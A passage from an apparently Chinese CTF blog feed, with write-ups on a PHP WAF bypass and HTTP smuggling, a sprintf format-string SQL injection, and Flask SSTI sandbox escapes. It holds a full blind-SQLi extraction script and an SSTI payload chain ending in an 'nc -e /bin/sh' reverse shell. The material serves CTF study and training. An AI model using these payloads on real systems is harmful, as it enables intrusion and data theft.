class="hljs-string">&quot; &quot;</span>;        &#125;    &#125;&#125;<span class="hljs-keyword">echo</span> $result;<span class="hljs-keyword">if</span>(file_exists(<span class="hljs-string">&quot;func_name.txt&quot;</span>))&#123;    unlink(<span class="hljs-string">&quot;func_name.txt&quot;</span>);&#125;<span class="hljs-keyword">else</span>&#123;    file_put_contents(<span class="hljs-string">&quot;func_name.txt&quot;</span>,$result);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>发包脚本</p><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><span class="hljs-keyword">import</span> requestss = <span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">zend_version func_num_args ………………（内置函数） xdebug_get_headers dl cli_set_process_title cli_get_process_title </span><span class="hljs-string"></span><span class="hljs-string">&#x27;&#x27;&#x27;</span>s = s.split(<span class="hljs-string">&#x27; &#x27;</span>)<span class="hljs-comment"># print s[0]</span><span class="hljs-comment"># print s</span><span class="hljs-comment"># con = requests.get(&#x27;http://eci-2zed3ztpomt9jfpdablo.cloudeci1.ichunqiu.com/?a=call_user_func&amp;b=&#x27;+s[0]).text</span><span class="hljs-comment"># print con</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:    con = requests.get(<span class="hljs-string">&#x27;http://eci-2zed3ztpomt9k9atz5n9.cloudeci1.ichunqiu.com/?a=&#x27;</span>+i).text    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> con:        <span class="hljs-comment"># if con != nothing:</span>        <span class="hljs-keyword">print</span> i        <span class="hljs-keyword">print</span> con.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF | [RoarCTF 2019]Easy Calc</title>
    <link href="/2021/04/13/buu/"/>
    <url>/2021/04/13/buu/</url>
    
    <content type="html"><![CDATA[<p>感觉这道题目有点意思</p><p>打开网页是个计算机，查源码</p><p><img src="/2021/04/13/buu/2.jpg" alt="2"></p><h3 id="法一：利用特性"><a class="header-anchor" href="#法一：利用特性">🍭</a>法一：利用特性</h3><p>提示有waf，先测试一下读目录</p><p><img src="/2021/04/13/buu/3.jpg" alt="3"></p><p>被ban了，应该跟waf有关，这里要利用一个之前没注意过的点：</p><h4 id="PHP的字符串解析特性"><a class="header-anchor" href="#PHP的字符串解析特性">🍭</a>PHP的字符串解析特性</h4><p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符转换为下划线（包括空格）</p><p>我们可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样代码能正常运行，还上传了非法字符。构造一个空格即可查目录,但是<code>/</code>过滤掉，此时可用char()转ascii再进行拼接</p><p><img src="/2021/04/13/buu/1.jpg" alt="1"></p><p>查到flag所在的文件名，列出flag</p><p><img src="/2021/04/13/buu/4.jpg" alt="4"></p><h3 id="法二-HTTP走私"><a class="header-anchor" href="#法二-HTTP走私">🍭</a>法二:HTTP走私</h3><p>其实用post模式发一个请求，就出现源码</p><p><img src="/2021/04/13/buu/5.jpg" alt="5"></p><blockquote><p>http走私</p><blockquote><p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p><p><img src="/2021/04/13/buu/6.jpg" alt="6"></p><p>详见：<a href="https://portswigger.net/web-security/request-smuggling">HTTP request smuggling</a></p></blockquote></blockquote><p>添加<code>Transfer-Encoding: chunked</code>，在消息体加几个回车</p><blockquote><p>分块传输编码（Chunked transfer encoding）是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由网页服务器发送给客户端的数据可以分成多个部分。分块传输编码只在HTTP协议1.1版本（HTTP/1.1）中提供</p></blockquote><p>这里用到的是CL-TE：</p><blockquote><p>所谓<code>CL-TE</code>，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>这一请求头。后端服务器会遵守<code>RFC2616</code>的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>这一请求头。</p><p><img src="/2021/04/13/buu/7.jpg" alt="7"></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>刷题</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sprintf格式化字符串漏洞</title>
    <link href="/2021/04/10/wei6/"/>
    <url>/2021/04/10/wei6/</url>
    
    <content type="html"><![CDATA[<h4 id="sprintf"><a class="header-anchor" href="#sprintf">🍭</a>sprintf()</h4><p>把格式化的字符串写入变量中。</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">sprintf</span><span class="hljs-params">(format,arg1,arg2,arg++)</span></span></code></pre><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>format</em></td><td>规定字符串以及如何格式化其中的变量。                                                                            可能的格式值：                                                                                                                           %% - 返回一个百分号                                                                                                            % %b - 二进制数                                                                                                                               %c - ASCII 值对应的字符                                                                                                                         %d - 包含正负号的十进制数（负数、0、正数）                                                                                      %e - 使用小写的科学计数法（例如 1.2e+2）                                                                                          %E - 使用大写的科学计数法（例如 1.2E+2）                                                                                        %u - 不包含正负号的十进制数（大于等于 0）                                                                                      %f - 浮点数（本地设置）                                                                                                                           %F - 浮点数（非本地设置）                                                                                                                  %g - 较短的 %e 和 %f                                                                                                                            %G - 较短的 %E 和 %f                                                                                                                              %o - 八进制数                                                                                                                                            %s - 字符串                                                                                                                                               %x - 十六进制数（小写字母）                                                                                            %X - 十六进制数（大写字母）                                                                                                                                        附加的格式值。必需放置在 % 和字母之间（例如 %.2f）：                                                                                 + （在数字前面加上 + 或 - 来定义数字的正负性。默认情况下，只有负数才做标记，正数不做标记）                                                                                                                                          ’ （规定使用什么作为填充，默认是空格。它必须与宽度指定器一起使用。例如：%'x20s（使用 “x” 作为填充））                                                                                                                  - （左调整变量值）                                                                                                                                          [0-9] （规定变量值的最小宽度）                                                                                                                  .[0-9] （规定小数位数或最大字符串长度）                                                                                                    注释：如果使用多个上述的格式值，它们必须按照以上顺序使用。</td></tr><tr><td><em>arg1</em>、<em>arg2</em>、<em>++</em></td><td>将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 <em>arg1</em>，在第二个 % 符号处，插入 <em>arg2</em>，依此类推。</td></tr></tbody></table><p>注释：如果 % 符号多于 <em>arg</em> 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 “$” 组成</p><h4 id="举个栗子"><a class="header-anchor" href="#举个栗子">🍭</a>举个栗子</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$num1 = <span class="hljs-number">123456789</span>;$num2 = <span class="hljs-number">-123456789</span>;$char = <span class="hljs-number">50</span>;<span class="hljs-keyword">echo</span> sprintf(<span class="hljs-string">&quot;%%b = %b&quot;</span>,$num1).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">// 二进制数</span><span class="hljs-keyword">echo</span> sprintf(<span class="hljs-string">&quot;%%c = %c&quot;</span>,$char).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">// ASCII 字符</span><span class="hljs-keyword">echo</span> sprintf(<span class="hljs-string">&quot;%%s = %s&quot;</span>,$num1).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">// 字符串</span><span class="hljs-keyword">echo</span> sprintf(<span class="hljs-string">&quot;%%x = %x&quot;</span>,$num1).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">// 十六进制数（小写）</span><span class="hljs-keyword">echo</span> sprintf(<span class="hljs-string">&quot;%%X = %X&quot;</span>,$num1).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">// 十六进制数（大写）</span><span class="hljs-meta">?&gt;</span>结果：%b = <span class="hljs-number">111010110111100110100010101</span>%c = <span class="hljs-number">2</span> %s = <span class="hljs-number">123456789</span>%x = <span class="hljs-number">75</span>bcd15%X = <span class="hljs-number">75</span>BCD15</code></pre><h3 id="sprintf注入原理"><a class="header-anchor" href="#sprintf注入原理">🍭</a><strong>sprintf注入原理</strong></h3><p>sprintf()的底层实现方法：</p><pre><code>switch (format[inpos]) &#123;case 's':    &#123;        zend_string * t;        zend_string * str = zval_get_tmp_string(tmp, &amp;t);        php_sprintf_appendstring( &amp; result, &amp;outpos, ZSTR_VAL(str), width, precision, padding, alignment, ZSTR_LEN(str), 0, expprec, 0);        zend_tmp_string_release(t);        break;    &#125;case 'd':    php_sprintf_appendint( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, always_sign);    break;case 'u':    php_sprintf_appenduint( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment);    break;case 'g':case 'G':case 'e':case 'E':case 'f':case 'F':    php_sprintf_appenddouble( &amp; result, &amp;outpos, zval_get_double(tmp), width, padding, alignment, precision, adjusting, format[inpos], always_sign);    break;case 'c':    php_sprintf_appendchar( &amp; result, &amp;outpos, (char) zval_get_long(tmp));    break;case 'o':    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 3, hexchars, expprec);    break;case 'x':    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 4, hexchars, expprec);    break;case 'X':    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 4, HEXCHARS, expprec);    break;case 'b':    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 1, hexchars, expprec);    break;case '%':    php_sprintf_appendchar( &amp; result, &amp;outpos, '%');    break;default:    break;&#125;</code></pre><h4 id="成因"><a class="header-anchor" href="#成因">🍭</a>成因</h4><p>php源码中只对15种类型做了匹配， 其他字符类型都跳过未做任何处理，没做字符类型检测的最大危害就是它可以吃掉一个转义符, 如果%后面出现一个,那么php会把\当作一个格式化字符的类型而吃掉, 最后%\（或%1$\）被替换为空。<strong>%后的一个字符(除了%，%上面表格已经给出了)都会被当作字符型类型而被吃掉，也就是被当作一个类型进行匹配后面的变量，比如%c匹配asciii码，%d匹配整数，如果不在定义的也会匹配，匹配空，比如%\，这样我们的目的只有一个，使得单引号逃逸，也就是能够起到闭合的作用</strong></p><h4 id="栗子"><a class="header-anchor" href="#栗子">🍭</a>栗子</h4><p><strong>不使用占位符号</strong></p><p><img src="/2021/04/10/wei6/1.png" alt="1"></p><p><strong>使用占位符号</strong></p><p><img src="/2021/04/10/wei6/3.png" alt="3"></p><p><strong>利用%c</strong></p><p><img src="/2021/04/10/wei6/2.png" alt="2"></p><p><strong>利用条件</strong></p><ul><li><strong>sql语句进行了字符拼接</strong></li><li><strong>拼接语句和原sql语句都用了vsprintf/sprintf 函数来格式化字符串</strong></li></ul><h3 id="【ichunqiu】SQLI"><a class="header-anchor" href="#【ichunqiu】SQLI">🍭</a>【ichunqiu】SQLI</h3><p>bp去测试过滤的符号发现%会出现不一样的情况</p><p><img src="/2021/04/10/wei6/7.png" alt="7"></p><p>测试</p><p><img src="/2021/04/10/wei6/4.jpg" alt="4"></p><p>sprintf函数出错，让单引号逃逸，构造：</p><p><code>username=admin%1$' and 1=2# </code></p><p><img src="/2021/04/10/wei6/5.jpg" alt="5"></p><p><code>username=admin%1$' and 1=1#</code></p><p><img src="/2021/04/10/wei6/6.jpg" alt="6"></p><p>发现’后面的语句带入执行了，这就是注入点，可以sqlmap跑或者脚本</p><p>脚本：</p><pre><code class="hljs powershell"><span class="hljs-comment">#coding:utf-8</span>import requestsimport string def boom():    url = <span class="hljs-built_in">r</span><span class="hljs-string">&#x27;http://f6f0cdc51f8141a6b1a8634161859c1c78499dc70eea47f0.game.ichunqiu.com/&#x27;</span>    s = requests.session()//会话对象requests.Session能够跨请求地保持某些参数，比如cookies，即在同一个Session实例发出的所有请求都保持同一个cookies,而requests模块每次会自动处理cookies，这样就很方便地处理登录时的cookies问题。    dic = string.digits + string.letters + <span class="hljs-string">&quot;!@#<span class="hljs-variable">$</span>%^&amp;*()_+&#123;&#125;-=&quot;</span>    right = <span class="hljs-string">&#x27;password error!&#x27;</span>    error = <span class="hljs-string">&#x27;username error!&#x27;</span>    lens = <span class="hljs-number">0</span>    i = <span class="hljs-number">0</span>//确定当前数据库的长度    <span class="hljs-keyword">while</span> True:        payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;length(database())&gt;&quot;</span> + str(i) + <span class="hljs-string">&quot;#&quot;</span>        <span class="hljs-keyword">data</span>=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;        <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content        <span class="hljs-keyword">if</span> error <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:            lens=i            <span class="hljs-keyword">break</span>        i+=<span class="hljs-number">1</span>        pass    print(<span class="hljs-string">&quot;[+]length(database()): %d&quot;</span> %(lens))//确定当前数据库的名字    strs=<span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(lens+<span class="hljs-number">1</span>):        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dic:            payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;ascii(substr(database(),&quot;</span> + str(i) +<span class="hljs-string">&quot;,1))=&quot;</span> + str(ord(c)) + <span class="hljs-string">&quot;#&quot;</span>            <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;            <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content            <span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:                strs = strs + c                print strs                <span class="hljs-keyword">break</span>        pass    pass    print(<span class="hljs-string">&quot;[+]database():%s&quot;</span> %(strs))     lens=<span class="hljs-number">0</span>    i = <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span> True:        payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;(select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;&quot;</span> + str(i) + <span class="hljs-string">&quot;#&quot;</span>//对当前的数据库，查询第一个表的长度        <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;        <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content        <span class="hljs-keyword">if</span> error <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:            lens = i            <span class="hljs-keyword">break</span>        i+=<span class="hljs-number">1</span>        pass    print(<span class="hljs-string">&quot;[+]length(table): %d&quot;</span> %(lens))     strs=<span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(lens+<span class="hljs-number">1</span>):        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dic:            payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;</span> + str(i) +<span class="hljs-string">&quot;,1))=&quot;</span> + str(ord(c)) + <span class="hljs-string">&quot;#&quot;</span>// 数字一定要str才可以传入            <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;            <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content            <span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:                strs = strs + c                print strs                <span class="hljs-keyword">break</span>        pass    pass    print(<span class="hljs-string">&quot;[+]table_name:%s&quot;</span> %(strs))    tablename = <span class="hljs-string">&#x27;0x&#x27;</span> + strs.encode(<span class="hljs-string">&#x27;hex&#x27;</span>)//编码为<span class="hljs-number">16</span>进制    table_name = strs     lens=<span class="hljs-number">0</span>    i = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> True:        payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;(select length(column_name) from information_schema.columns where table_name = &quot;</span> + str(tablename) + <span class="hljs-string">&quot; limit 0,1)&gt;&quot;</span> + str(i) + <span class="hljs-string">&quot;#&quot;</span>        <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;        <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content        <span class="hljs-keyword">if</span> error <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:            lens = i            <span class="hljs-keyword">break</span>        i+=<span class="hljs-number">1</span>        pass    print(<span class="hljs-string">&quot;[+]length(column): %d&quot;</span> %(lens))     strs=<span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(lens+<span class="hljs-number">1</span>):        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dic:            payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;ascii(substr((select column_name from information_schema.columns where table_name = &quot;</span> + str(tablename) +<span class="hljs-string">&quot; limit 0,1),&quot;</span> + str(i) + <span class="hljs-string">&quot;,1))=&quot;</span> + str(ord(c)) + <span class="hljs-string">&quot;#&quot;</span>            <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;            <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content            <span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:                strs = strs + c                print strs                <span class="hljs-keyword">break</span>        pass    pass    print(<span class="hljs-string">&quot;[+]column_name:%s&quot;</span> %(strs))    column_name = strs    num=<span class="hljs-number">0</span>    i = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> True:        payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;(select count(*) from &quot;</span> + table_name + <span class="hljs-string">&quot;)&gt;&quot;</span> + str(i) + <span class="hljs-string">&quot;#&quot;</span>        <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;        <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content        <span class="hljs-keyword">if</span> error <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:            num = i            <span class="hljs-keyword">break</span>        i+=<span class="hljs-number">1</span>        pass    print(<span class="hljs-string">&quot;[+]number(column): %d&quot;</span> %(num))     lens=<span class="hljs-number">0</span>    i = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> True:        payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;(select length(&quot;</span> + column_name + <span class="hljs-string">&quot;) from &quot;</span> + table_name + <span class="hljs-string">&quot; limit 0,1)&gt;&quot;</span> + str(i) + <span class="hljs-string">&quot;#&quot;</span>        <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;        <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content        <span class="hljs-keyword">if</span> error <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:            lens = i            <span class="hljs-keyword">break</span>        i+=<span class="hljs-number">1</span>        pass    print(<span class="hljs-string">&quot;[+]length(value): %d&quot;</span> %(lens))     i=<span class="hljs-number">1</span>        strs=<span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(lens+<span class="hljs-number">1</span>):        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dic:            payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or ascii(substr((select flag from flag limit 0,1),&quot;</span> + str(i) + <span class="hljs-string">&quot;,1))=&quot;</span> + str(ord(c)) + <span class="hljs-string">&quot;#&quot;</span>            <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125;            <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content            <span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:                strs = strs + c                print strs                <span class="hljs-keyword">break</span>        pass    pass    print(<span class="hljs-string">&quot;[+]flag:%s&quot;</span> %(strs)) <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    boom()    print <span class="hljs-string">&#x27;Finish!&#x27;</span></code></pre><p>参考：<a href="https://blog.csdn.net/weixin_41185953/article/details/80485075">深入解析sprintf格式化字符串漏洞</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SSTI(二)</title>
    <link href="/2021/04/06/wei4/"/>
    <url>/2021/04/06/wei4/</url>
    
    <content type="html"><![CDATA[<h4 id="命令执行"><a class="header-anchor" href="#命令执行">🍭</a>命令执行</h4><p>命令执行，其实就是沙盒溢出的操作。</p><h5 id="tips1"><a class="header-anchor" href="#tips1">🍭</a>tips1</h5><blockquote><p>from_pyfile</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">from_pyfile</span>(<span class="hljs-params">self, filename, silent=False</span>):</span> filename = os.path.join(self.root_path, filename) d = types.ModuleType(<span class="hljs-string">&#x27;config&#x27;</span>) d.__file__ = filename <span class="hljs-keyword">try</span>:     <span class="hljs-keyword">with</span> open(filename) <span class="hljs-keyword">as</span> config_file:         exec(compile(config_file.read(), filename, <span class="hljs-string">&#x27;exec&#x27;</span>), d.__dict__) <span class="hljs-keyword">except</span> IOError <span class="hljs-keyword">as</span> e:     <span class="hljs-keyword">if</span> silent <span class="hljs-keyword">and</span> e.errno <span class="hljs-keyword">in</span> (errno.ENOENT, errno.EISDIR):         <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>     e.strerror = <span class="hljs-string">&#x27;Unable to load configuration file (%s)&#x27;</span> % e.strerror     <span class="hljs-keyword">raise</span> self.from_object(d) <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></code></pre><p>from_object</p><pre><code class="hljs ruby"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">from_object</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, obj)</span></span><span class="hljs-symbol">:</span> <span class="hljs-keyword">if</span> isinstance(obj, string_types)<span class="hljs-symbol">:</span>     obj = import_string(obj) <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dir(obj)<span class="hljs-symbol">:</span>     <span class="hljs-keyword">if</span> key.isupper()<span class="hljs-symbol">:</span>         <span class="hljs-keyword">self</span>[key] = getattr(obj, key)</code></pre><p>此方法将传入的文件使用 compile() 这个python 的内置方法将其编译成字节码(.pyc),并放到 exec() 里面去执行，参数 <code>d.__dict__</code>的含义是指定 exec 执行的上下文。此方法执行的代码片段被放入了 <code>d.__dict__</code> 中,并在后面调用了 from_object() 方法，此方法会遍历  Obj 的 dict 并且找到大写字母的属性，将属性的值给 self[‘属性名’]，如果能让 from_pyfile 去读这样的一个文件：</p><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> os import systemSHELL = system</code></pre><p>我们就能通过 config[‘SHELL’] 调用 system 方法了，文件怎么写入就需要绕过沙盒的方式写入我们想要的文件。</p><p>payload：</p><pre><code class="hljs markdown">&#123; &#123; &#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/tmp/evil&#x27;, &#x27;w&#x27;</span>).write(&#x27;from os import system%0aSHELL = system&#x27;) &#125; &#125;//写文件&#123; &#123; config.from<span class="hljs-emphasis">_pyfile(&#x27;/tmp/evil&#x27;) &#125; &#125;</span><span class="hljs-emphasis">//加载system</span><span class="hljs-emphasis">&#123; &#123; config[<span class="hljs-string">&#x27;SHELL&#x27;</span>](<span class="hljs-link">&#x27;nc xxxx xx -e /bin/sh&#x27;</span>) &#125; &#125;</span><span class="hljs-emphasis">//执行命令反弹SHELL</span></code></pre></blockquote><h5 id="tips2"><a class="header-anchor" href="#tips2">🍭</a>tips2</h5><p>在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。</p><p>运行代码:</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span>.__class__)</span></span></code></pre><p>返回了&lt;class ‘str’&gt;，对于一个空字符串他已经打印了str类型，在python中，每个类都有一个<strong>bases</strong>属性，列出其基类.</p><pre><code class="hljs reasonml">print(<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>)</span></span></code></pre><p>打印返回(&lt;class ‘object’&gt;,)，我们已经找到了他的基类object，而我们想要寻找object类的不仅仅只有bases，同样可以使用<strong>mro</strong>，<strong>mro</strong>给出了method resolution order，即解析方法调用的顺序。我们实例打印一下mro。</p><pre><code class="hljs reasonml">print(<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>)</span></span></code></pre><p>返回了(&lt;class ‘str’&gt;, &lt;class ‘object’&gt;)，同样可以找到object类，正是由于这些但不仅限于这些方法，我们才有了各种沙箱逃逸的姿势。正如上面的解释，<strong>mro</strong>返回了解析方法调用的顺序，将会打印两个。在flask ssti中poc中很大一部分是从object类中寻找我们可利用的类的方法。接下来使用subclasses（返回的是这个类的子类的集合，也就是object类的子类的集合）</p><pre><code class="hljs reasonml">print(<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>].<span class="hljs-constructor">__subclasses__()</span>)</code></pre><p>python 3.6 版本下的object类下的方法集合。<strong>2.7和3.6版本返回的子类不是一样的，但是2.7有的3.6大部分都有</strong>。需要自己寻找合适的标号来调用。</p><p>举个栗子:<strong>在python环境下，不直接使用open打开一个文件</strong></p><pre><code class="hljs delphi"><span class="hljs-comment">// python2</span>&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.__class__&lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__(&lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[&lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span 